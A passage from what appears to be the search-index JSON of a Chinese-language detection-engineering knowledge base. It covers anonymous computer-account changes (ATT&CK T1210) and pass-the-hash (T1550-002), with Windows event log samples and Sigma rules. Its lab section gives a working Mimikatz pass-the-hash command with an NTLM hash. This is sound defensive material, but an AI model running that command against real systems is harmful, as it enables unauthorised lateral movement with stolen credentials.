\u6839\u636e\u6613\u53d7\u653b\u51fb\u7684\u8fdc\u7a0b\u670d\u52a1\u7684\u6743\u9650\u7ea7\u522b\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u7531\u4e8e\u6a2a\u5411\u79fb\u52a8\u5229\u7528\u800c\u5b9e\u73b0\u5bf9\u7279\u6743\u5347\u7ea7\u7684\u5229\u7528\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_1","text":"\u53c2\u8003\u8d44\u6599\u5982\u4e0b\uff1a https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_4","text":"\u6682\u65e0\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u89c4\u5219\u76f8\u5173\u7684\u65e5\u5fd7\u793a\u4f8b windows server 2016/win10 EventID\uff1a4742 A computer account was changed. Subject: Security ID: ACME\\Administrator Account Name: Administrator Account Domain: ACME Logon ID: 0x27a79 Computer Account That Was Changed: Security ID: S-1-5-21-3108364787-189202583-342365621-1109 Account Name: WS2321$ Account Domain: ACME Changed Attributes: SAM Account Name: - Display Name: - User Principal Name: - Home Directory: - Home Drive: - Script Path: - Profile Path: - User Workstations: - Password Last Set: - Account Expires: - Primary Group ID: - AllowedToDelegateTo: - Old UAC Value: 0x85 New UAC Value: 0x84 User Account Control: Account Enabled User Parameters: - SID History: - Logon Hours: - DNS Host Name: - Service Principal Names: - Additional Information: Privileges: - EventID\uff1a4624 An account was successfully logged on. Subject: Security ID: SYSTEM Account Name: DESKTOP-LLHJ389$ Account Domain: WORKGROUP Logon ID: 0x3E7 Logon Information: Logon Type: 7 Restricted Admin Mode: - Virtual Account: No Elevated Token: No Impersonation Level: Impersonation New Logon: Security ID: AzureAD\\RandyFranklinSmith Account Name: rsmith@montereytechgroup.com Account Domain: AzureAD Logon ID: 0xFD5113F Linked Logon ID: 0xFD5112A Network Account Name: - Network Account Domain: - Logon GUID: {00000000-0000-0000-0000-000000000000} Process Information: Process ID: 0x30c Process Name: C:\\Windows\\System32\\lsass.exe Network Information: Workstation Name: DESKTOP-LLHJ389 Source Network Address: - Source Port: - Detailed Authentication Information: Logon Process: Negotiat Authentication Package: Negotiate Transited Services: - Package Name (NTLM only): - Key Length: 0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#sigma","text":"title: \u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528 description: \u901a\u8fc7windows\u5b89\u5168\u65e5\u5fd7\uff0c\u68c0\u6d4b\u533f\u540d\u7528\u6237\u66f4\u6539\u7684\u4f7f\u7528\u3002 tags: T1210 status: experimental references: - https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_computer_changed_with_anonymous_account.yml logsource: product: windows service: security detection: selection: EventID: - \u201c4742\u201d - \u201c4624\u201d Account Name: \u201cANONYMOUSLOGON\u201d Logon Type: 3 condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_6","text":"\u6b64\u641c\u7d22\u9700\u8981\u542f\u7528\u5ba1\u6838\u8ba1\u7b97\u673a\u5e10\u6237\u7ba1\u7406\u5728\u7cfb\u7edf\u4e0a\u751f\u6210\u4e8b\u4ef6ID4742\u3002\u6211\u4eec\u5f3a\u70c8\u5efa\u8bae\u60a8\u6307\u5b9a\u7279\u5b9a\u4e8e\u73af\u5883\u7684\u914d\u7f6e\uff08\u7d22\u5f15\uff0c\u6e90\uff0c\u6e90\u7c7b\u578b\u7b49\uff09Windows\u4e8b\u4ef6\u65e5\u5fd7\u3002","title":"\u5efa\u8bae"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1210-win-%E6%A3%80%E6%B5%8B%E5%88%B0%E5%8C%BF%E5%90%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%B4%A6%E6%88%B7%E6%9B%B4%E6%94%B9%E7%9A%84%E4%BD%BF%E7%94%A8/#_7","text":"MITRE-ATT&CK-T1210 https://attack.mitre.org/techniques/T1210 \u68c0\u6d4b\u5230\u533f\u540d\u8ba1\u7b97\u673a\u8d26\u6237\u66f4\u6539\u7684\u4f7f\u7528 https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_computer_changed_with_anonymous_account.yml","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/","text":"T1550-002-windows-\u54c8\u5e0c\u4f20\u9012 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u88ab\u76d7\u7684\u5bc6\u7801\u54c8\u5e0c\u6765\u201c\u4f20\u9012\u54c8\u5e0c\u201d\uff0c\u4ece\u800c\u5728\u73af\u5883\u4e2d\u6a2a\u5411\u79fb\u52a8\uff0c\u4ece\u800c\u7ed5\u8fc7\u6b63\u5e38\u7684\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u3002\u4f20\u9012\u54c8\u5e0c\uff08PtH\uff09\u662f\u4e00\u79cd\u65e0\u9700\u8bbf\u95ee\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801\u5373\u53ef\u4f5c\u4e3a\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u7684\u65b9\u6cd5\u3002\u6b64\u65b9\u6cd5\u7ed5\u8fc7\u9700\u8981\u660e\u6587\u5bc6\u7801\u7684\u6807\u51c6\u8eab\u4efd\u9a8c\u8bc1\u6b65\u9aa4\uff0c\u800c\u76f4\u63a5\u8fdb\u5165\u4f7f\u7528\u5bc6\u7801\u54c8\u5e0c\u7684\u8eab\u4efd\u9a8c\u8bc1\u90e8\u5206\u3002\u5728\u8fd9\u79cd\u6280\u672f\u4e2d\uff0c\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u53ef\u4ee5\u6355\u83b7\u6b63\u5728\u4f7f\u7528\u7684\u5e10\u6237\u7684\u6709\u6548\u5bc6\u7801\u54c8\u5e0c\u3002\u6355\u83b7\u7684\u54c8\u5e0c\u4e0ePtH\u4e00\u8d77\u7528\u4e8e\u9a8c\u8bc1\u8be5\u7528\u6237\u8eab\u4efd\u3002\u4e00\u65e6\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\uff0cPtH\u53ef\u7528\u4e8e\u5728\u672c\u5730\u6216\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u6267\u884c\u64cd\u4f5c\u3002 \u5177\u6709KB2871997\u7684Windows 7\u53ca\u66f4\u9ad8\u7248\u672c\u9700\u8981\u6709\u6548\u7684\u57df\u7528\u6237\u51ed\u636e\u6216RID 500\u7ba1\u7406\u5458\u54c8\u5e0c\u3002 \u6d4b\u8bd5\u6848\u4f8b passing the hash\uff0c\u4e2d\u6587\u4e00\u822c\u7ffb\u8bd1\u4e3ahash\u4f20\u9012\u653b\u51fb\uff0c\u5728windows\u7cfb\u7edf\u4e2d\uff0c\u7cfb\u7edf\u901a\u5e38\u4e0d\u4f1a\u5b58\u50a8\u7528\u6237\u767b\u5f55\u5bc6\u7801\uff0c\u800c\u662f\u5b58\u50a8\u5bc6\u7801\u7684\u54c8\u5e0c\u503c\uff0c\u5728\u6211\u4eec\u8fdc\u7a0b\u767b\u5f55\u7cfb\u7edf\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u5411\u8fdc\u7a0b\u4f20\u9012\u7684\u5c31\u662f\u5bc6\u7801\u7684hash\u503c\u3002\u5f53\u653b\u51fb\u8005\u83b7\u53d6\u4e86\u5b58\u50a8\u5728\u8ba1\u7b97\u673a\u4e0a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684hash\u503c\u7684\u65f6\u5019\uff0c\u4ed6\u867d\u7136\u4e0d\u77e5\u9053\u5bc6\u7801\u503c\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8fde\u63a5\u8fdc\u7a0b\u4e3b\u673a\uff0c\u901a\u8fc7\u4f20\u9001\u5bc6\u7801\u7684hash\u503c\u6765\u8fbe\u5230\u767b\u5f55\u7684\u76ee\u7684\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9776\u673a\u3001\u653b\u51fb\u673a\uff09 \u6d4b\u8bd5\u590d\u73b0 \u57fa\u7840\u73af\u5883 DC\uff1awindows server 2008 R2 PC1\uff1awindows server 2008 R2 \uff08\u76ee\u6807\u4e3b\u673a\uff09 PC2\uff1awin 7 \uff08\u653b\u51fb\u673a\uff09 Mimikatz \uff08\u6d4b\u8bd5\u5de5\u5177\uff09 \u6d4b\u8bd5\u8fc7\u7a0b 1.\u83b7\u53d6\u76f8\u5173\u8d26\u6237\u7684NTLM\u54c8\u5e0c\uff0c\u5177\u4f53\u8fc7\u7a0b\u4e0d\u518d\u6f14\u793a\uff0cmimikatz\u5373\u53ef 2.\u5229\u7528mimikatz\u8fdb\u884cPTH mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:administrator /domain:xiaomi.org /ntlm:762c6fa6a9adb2f5ff215484bd8296b7\" \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7 \u76ee\u6807\u4e3b\u673a-PC1-PTH\u6210\u529f Event-ID: 4624 \u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002 \u4f7f\u7528\u8005: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u767b\u5f55\u7c7b\u578b: 3 \u65b0\u767b\u5f55: \u5b89\u5168 ID: S-1-5-21-3576461989-1381017913-248049510-500 \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: XIAOMI \u767b\u5f55 ID: 0xF86B9 \u767b\u5f55 GUID: {00000000-0000-0000-0000-000000000000} \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x0 \u8fdb\u7a0b\u540d: - \u7f51\u7edc\u4fe1\u606f: \u5de5\u4f5c\u7ad9\u540d: 12306BR0-PC \u6e90\u7f51\u7edc\u5730\u5740: 192.168.66.88 \u6e90\u7aef\u53e3: 49251 \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f: \u767b\u5f55\u8fdb\u7a0b: NtLmSsp \u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305: NTLM \u4f20\u9012\u7684\u670d\u52a1: - \u6570\u636e\u5305\u540d(\u4ec5\u9650 NTLM): NTLM V2 \u5bc6\u94a5\u957f\u5ea6: 128 \u76ee\u6807\u4e3b\u673a-PC1-PTH\u5931\u8d25 Event-ID: 4625 \u767b\u5f55\u5931\u8d25\u7684\u5e10\u6237: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: administrator \u5e10\u6237\u57df: xiaomi.org \u5931\u8d25\u4fe1\u606f: \u5931\u8d25\u539f\u56e0: \u672a\u77e5\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u3002 \u72b6\u6001: 0xC000006D \u5b50\u72b6\u6001: 0xC000006A \u8fdb\u7a0b\u4fe1\u606f: \u8c03\u7528\u65b9\u8fdb\u7a0b ID: 0x0 \u8c03\u7528\u65b9\u8fdb\u7a0b\u540d: - \u7f51\u7edc\u4fe1\u606f: \u5de5\u4f5c\u7ad9\u540d: 12306BR0-PC \u6e90\u7f51\u7edc\u5730\u5740: 192.168.66.88 \u6e90\u7aef\u53e3: 49253 \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f: \u767b\u5f55\u8fdb\u7a0b: NtLmSsp \u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305: NTLM \u4f20\u9012\u670d\u52a1: - \u6570\u636e\u5305\u540d(\u4ec5\u9650 NTLM): - \u5bc6\u94a5\u957f\u5ea6: 0 \u653b\u51fb\u673a-PC2 Event-ID: 4624 \u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002 \u4f7f\u7528\u8005: \u5b89\u5168 ID: S-1-5-21-3579006141-3881886638-2121494774-1000 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x1AB7F9 \u767b\u5f55\u7c7b\u578b: 9 \u65b0\u767b\u5f55: \u5b89\u5168 ID: S-1-5-21-3579006141-3881886638-2121494774-1000 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x234995 \u767b\u5f55 GUID: {00000000-0000-0000-0000-000000000000} \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x398 \u8fdb\u7a0b\u540d: C:\\Windows\\System32\\svchost.exe \u7f51\u7edc\u4fe1\u606f: \u5de5\u4f5c\u7ad9\u540d: \u6e90\u7f51\u7edc\u5730\u5740: ::1 \u6e90\u7aef\u53e3: 0 \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f: \u767b\u5f55\u8fdb\u7a0b: seclogo \u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305: Negotiate \u4f20\u9012\u7684\u670d\u52a1: - \u6570\u636e\u5305\u540d(\u4ec5\u9650 NTLM): - \u5bc6\u94a5\u957f\u5ea6: 0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Pass the Hash Activity\uff08\u76ee\u6807\u4e3b\u673a\uff09 id: f8d98d6c-7a07-4d74-b064-dd4a3c244528 status: experimental description: Detects the attack technique pass the hash which is used to move laterally inside the network references: - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events author: Ilias el Matani (rule), The Information Assurance Directorate at the NSA (method) date: 2017/03/08 tags: - attack.lateral_movement - attack.T1550-002 - car.2016-04-004 logsource: product: windows service: security definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624, a failed logon attempt would trigger an event ID 4625 detection: selection: - EventID: 4624 LogonType: '3' LogonProcessName: 'NtLmSsp' WorkstationName: '%Workstations%' ComputerName: '%Workstations%' - EventID: 4625 LogonType: '3' LogonProcessName: 'NtLmSsp' WorkstationName: '%Workstations%' ComputerName: '%Workstations%' filter: AccountName: 'ANONYMOUS LOGON' condition: selection and not filter falsepositives: - Administrator activity - Penetration tests level: medium title: Pass the Hash Activity 2\uff08\u653b\u51fb\u673a\uff09 id: 8eef149c-bd26-49f2-9e5a-9b00e3af499b status: production description: Detects the attack technique pass the hash which is used to move laterally inside the network references: - https://github.com/iadgov/Event-Forwarding-Guidance/tree/master/Events - https://blog.binarydefense.com/reliably-detecting-pass-the-hash-through-event-log-analysis - https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/ author: Dave Kennedy, Jeff Warren (method) / David Vassallo (rule) date: 2019/06/14 tags: - attack.lateral_movement - attack.T1550-002 logsource: product: windows service: security definition: The successful use of PtH for lateral movement between workstations would trigger event ID 4624 detection: selection: - EventID: 4624 SubjectUserSid: 'S-1-0-0' LogonType: '3' LogonProcessName: 'NtLmSsp' KeyLength: '0' - EventID: 4624 #\u672a\u6d4b\u8bd5\u89e6\u53d1\u6b64\u7279\u5f81 LogonType: '9' LogonProcessName: 'seclogo' filter: AccountName: 'ANONYMOUS LOGON' condition: selection and not filter falsepositives: - Administrator activity - Penetration tests level: medium \u5efa\u8bae \u89c4\u5219\u672a\u7ecf\u8fc7\u5b9e\u9645\u73af\u5883\u6d4b\u8bd5\u9a8c\u8bc1\u68c0\u6d4b\u6548\u679c\uff0c\u8c28\u614e\u4f7f\u7528\uff01 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1550-002 https://attack.mitre.org/techniques/T1550/002/ windows-\u54c8\u5e0c\u4f20\u90121 https://github.com/12306Bro/sigma/blob/master/rules/windows/builtin/win_pass_the_hash.yml windows-\u54c8\u5e0c\u4f20\u90122 https://github.com/12306Bro/sigma/blob/master/rules/windows/builtin/win_pass_the_hash_2.yml","title":"T1550-002-windows-\u54c8\u5e0c\u4f20\u9012"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#t1550-002-windows-","text":"","title":"T1550-002-windows-\u54c8\u5e0c\u4f20\u9012"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u88ab\u76d7\u7684\u5bc6\u7801\u54c8\u5e0c\u6765\u201c\u4f20\u9012\u54c8\u5e0c\u201d\uff0c\u4ece\u800c\u5728\u73af\u5883\u4e2d\u6a2a\u5411\u79fb\u52a8\uff0c\u4ece\u800c\u7ed5\u8fc7\u6b63\u5e38\u7684\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u3002\u4f20\u9012\u54c8\u5e0c\uff08PtH\uff09\u662f\u4e00\u79cd\u65e0\u9700\u8bbf\u95ee\u7528\u6237\u7684\u660e\u6587\u5bc6\u7801\u5373\u53ef\u4f5c\u4e3a\u7528\u6237\u8eab\u4efd\u9a8c\u8bc1\u7684\u65b9\u6cd5\u3002\u6b64\u65b9\u6cd5\u7ed5\u8fc7\u9700\u8981\u660e\u6587\u5bc6\u7801\u7684\u6807\u51c6\u8eab\u4efd\u9a8c\u8bc1\u6b65\u9aa4\uff0c\u800c\u76f4\u63a5\u8fdb\u5165\u4f7f\u7528\u5bc6\u7801\u54c8\u5e0c\u7684\u8eab\u4efd\u9a8c\u8bc1\u90e8\u5206\u3002\u5728\u8fd9\u79cd\u6280\u672f\u4e2d\uff0c\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u53ef\u4ee5\u6355\u83b7\u6b63\u5728\u4f7f\u7528\u7684\u5e10\u6237\u7684\u6709\u6548\u5bc6\u7801\u54c8\u5e0c\u3002\u6355\u83b7\u7684\u54c8\u5e0c\u4e0ePtH\u4e00\u8d77\u7528\u4e8e\u9a8c\u8bc1\u8be5\u7528\u6237\u8eab\u4efd\u3002\u4e00\u65e6\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\uff0cPtH\u53ef\u7528\u4e8e\u5728\u672c\u5730\u6216\u8fdc\u7a0b\u7cfb\u7edf\u4e0a\u6267\u884c\u64cd\u4f5c\u3002 \u5177\u6709KB2871997\u7684Windows 7\u53ca\u66f4\u9ad8\u7248\u672c\u9700\u8981\u6709\u6548\u7684\u57df\u7528\u6237\u51ed\u636e\u6216RID 500\u7ba1\u7406\u5458\u54c8\u5e0c\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_1","text":"passing the hash\uff0c\u4e2d\u6587\u4e00\u822c\u7ffb\u8bd1\u4e3ahash\u4f20\u9012\u653b\u51fb\uff0c\u5728windows\u7cfb\u7edf\u4e2d\uff0c\u7cfb\u7edf\u901a\u5e38\u4e0d\u4f1a\u5b58\u50a8\u7528\u6237\u767b\u5f55\u5bc6\u7801\uff0c\u800c\u662f\u5b58\u50a8\u5bc6\u7801\u7684\u54c8\u5e0c\u503c\uff0c\u5728\u6211\u4eec\u8fdc\u7a0b\u767b\u5f55\u7cfb\u7edf\u7684\u65f6\u5019\uff0c\u5b9e\u9645\u4e0a\u5411\u8fdc\u7a0b\u4f20\u9012\u7684\u5c31\u662f\u5bc6\u7801\u7684hash\u503c\u3002\u5f53\u653b\u51fb\u8005\u83b7\u53d6\u4e86\u5b58\u50a8\u5728\u8ba1\u7b97\u673a\u4e0a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684hash\u503c\u7684\u65f6\u5019\uff0c\u4ed6\u867d\u7136\u4e0d\u77e5\u9053\u5bc6\u7801\u503c\uff0c\u4f46\u662f\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u76f4\u63a5\u8fde\u63a5\u8fdc\u7a0b\u4e3b\u673a\uff0c\u901a\u8fc7\u4f20\u9001\u5bc6\u7801\u7684hash\u503c\u6765\u8fbe\u5230\u767b\u5f55\u7684\u76ee\u7684\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9776\u673a\u3001\u653b\u51fb\u673a\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_4","text":"DC\uff1awindows server 2008 R2 PC1\uff1awindows server 2008 R2 \uff08\u76ee\u6807\u4e3b\u673a\uff09 PC2\uff1awin 7 \uff08\u653b\u51fb\u673a\uff09 Mimikatz \uff08\u6d4b\u8bd5\u5de5\u5177\uff09","title":"\u57fa\u7840\u73af\u5883"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_5","text":"1.\u83b7\u53d6\u76f8\u5173\u8d26\u6237\u7684NTLM\u54c8\u5e0c\uff0c\u5177\u4f53\u8fc7\u7a0b\u4e0d\u518d\u6f14\u793a\uff0cmimikatz\u5373\u53ef 2.\u5229\u7528mimikatz\u8fdb\u884cPTH mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:administrator /domain:xiaomi.org /ntlm:762c6fa6a9adb2f5ff215484bd8296b7\"","title":"\u6d4b\u8bd5\u8fc7\u7a0b"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#_6","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#-pc1-pth","text":"Event-ID: 4624 \u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002 \u4f7f\u7528\u8005: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u767b\u5f55\u7c7b\u578b: 3 \u65b0\u767b\u5f55: \u5b89\u5168 ID: S-1-5-21-3576461989-1381017913-248049510-500 \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: XIAOMI \u767b\u5f55 ID: 0xF86B9 \u767b\u5f55 GUID: {00000000-0000-0000-0000-000000000000} \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x0 \u8fdb\u7a0b\u540d: - \u7f51\u7edc\u4fe1\u606f: \u5de5\u4f5c\u7ad9\u540d: 12306BR0-PC \u6e90\u7f51\u7edc\u5730\u5740: 192.168.66.88 \u6e90\u7aef\u53e3: 49251 \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f: \u767b\u5f55\u8fdb\u7a0b: NtLmSsp \u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305: NTLM \u4f20\u9012\u7684\u670d\u52a1: - \u6570\u636e\u5305\u540d(\u4ec5\u9650 NTLM): NTLM V2 \u5bc6\u94a5\u957f\u5ea6: 128","title":"\u76ee\u6807\u4e3b\u673a-PC1-PTH\u6210\u529f"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#-pc1-pth_1","text":"Event-ID: 4625 \u767b\u5f55\u5931\u8d25\u7684\u5e10\u6237: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: administrator \u5e10\u6237\u57df: xiaomi.org \u5931\u8d25\u4fe1\u606f: \u5931\u8d25\u539f\u56e0: \u672a\u77e5\u7528\u6237\u540d\u6216\u5bc6\u7801\u9519\u8bef\u3002 \u72b6\u6001: 0xC000006D \u5b50\u72b6\u6001: 0xC000006A \u8fdb\u7a0b\u4fe1\u606f: \u8c03\u7528\u65b9\u8fdb\u7a0b ID: 0x0 \u8c03\u7528\u65b9\u8fdb\u7a0b\u540d: - \u7f51\u7edc\u4fe1\u606f: \u5de5\u4f5c\u7ad9\u540d: 12306BR0-PC \u6e90\u7f51\u7edc\u5730\u5740: 192.168.66.88 \u6e90\u7aef\u53e3: 49253 \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f: \u767b\u5f55\u8fdb\u7a0b: NtLmSsp \u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305: NTLM \u4f20\u9012\u670d\u52a1: - \u6570\u636e\u5305\u540d(\u4ec5\u9650 NTLM): - \u5bc6\u94a5\u957f\u5ea6: 0","title":"\u76ee\u6807\u4e3b\u673a-PC1-PTH\u5931\u8d25"},{"location":"0xA_%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/T1550-002-win-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92/#-pc2","text":"Event-ID: 4624 \u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002 \u4f7f\u7528\u8005: \u5b89\u5168 ID: S-1-5-21-3579006141-3881886638-2121494774-1000 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x1AB7F9 \u767b\u5f55\u7c7b\u578b: 9 \u65b0\u767b\u5f55: \u5b89\u5168 ID: S-1-5-21-3579006141-3881886638-2121494774-1000 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x234995 \u767b\u5f55 GUID: {00000000-0000-0000-0000-000000000000} \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x398 \u8fdb\u7a0b\u540d: C:\\Windows\\System32\\svchost.exe \u7f51\u7edc\u4fe1\u606f: \u5de5\u4f5c\u7ad9\u540d: \u6e90\u7f51\u7edc\u5730\u5740: ::1 \u6e90\u7aef\u53e3: 0 \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f: 